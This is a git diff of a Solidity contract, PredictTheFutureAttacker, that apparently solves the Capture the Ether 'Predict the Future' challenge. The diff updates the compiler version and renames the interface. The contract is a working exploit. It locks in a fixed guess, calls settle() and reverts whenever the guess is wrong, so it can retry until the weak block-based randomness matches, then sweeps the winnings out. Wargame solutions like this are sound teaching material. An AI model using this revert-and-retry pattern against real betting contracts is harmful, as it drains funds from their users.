@@ -1,33 +1,25 @@
-pragma solidity ^0.7.3;
 
-interface IPredictTheFutureChallenge {
+pragma solidity ^0.8.9;
+
+interface IChallenge {
     function isComplete() external view returns (bool);
-
-    function lockInGuess(uint8 n) external payable;
-
     function settle() external;
+    function lockInGuess(uint8 n) external payable;
 }
 
 contract PredictTheFutureAttacker {
-    IPredictTheFutureChallenge public challenge;
-
-    constructor(address challengeAddress) {
-        challenge = IPredictTheFutureChallenge(challengeAddress);
+    IChallenge private challenge;
+    constructor (address challengeAddress) {
+      challenge = IChallenge(challengeAddress);
     }
-
-    function lockInGuess(uint8 n) external payable {
-        // need to call it from this contract because guesser is stored and checked
-        // when settling
-        challenge.lockInGuess{value: 1 ether}(n);
+    function lock() external payable{
+        challenge.lockInGuess{value:1 ether}(uint8(0));
     }
 
     function attack() external payable {
         challenge.settle();
-
-        // if we guessed wrong, revert
-        require(challenge.isComplete(), "challenge not completed");
-        // return all of it to EOA
-        tx.origin.transfer(address(this).balance);
+        require(challenge.isComplete(),"challenge not completed");
+        payable(msg.sender).transfer(address(this).balance);
     }
 
     receive() external payable {}
